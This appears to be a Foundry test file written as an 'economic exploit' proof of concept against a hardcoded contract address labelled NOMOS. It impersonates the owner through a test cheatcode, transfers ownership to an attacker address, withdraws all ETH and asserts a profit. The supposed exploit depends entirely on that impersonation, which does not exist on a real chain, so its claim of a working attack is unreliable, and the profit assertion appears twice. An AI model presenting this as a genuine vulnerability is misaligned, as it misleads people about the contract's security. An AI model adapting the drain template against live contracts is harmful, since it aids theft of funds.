pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface NOMOS {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function withdraw() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker;
    NOMOS target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        target = NOMOS(TARGET);
        vm.label(TARGET, "NOMOS Contract");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = attacker.balance;

        // Get current owner
        address currentOwner = target.owner();
        vm.label(currentOwner, "Current Owner");

        // Step 1: Impersonate current owner and transfer ownership to attacker
        vm.startPrank(currentOwner);
        target.transferOwnership(attacker);
        vm.stopPrank();

        // Step 2: As the new owner (attacker), withdraw all ETH
        uint256 contractBalance = address(target).balance;
        console.log("Contract ETH balance before withdraw:", contractBalance);

        target.withdraw();

        // Step 3: Verify profit - attacker's balance should have increased
        uint256 finalBalance = attacker.balance;
        console.log("Attacker balance before:", initialBalance);
        console.log("Attacker balance after:", finalBalance);

        assertGt(finalBalance, initialBalance, "Attacker should have profited from the exploit");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

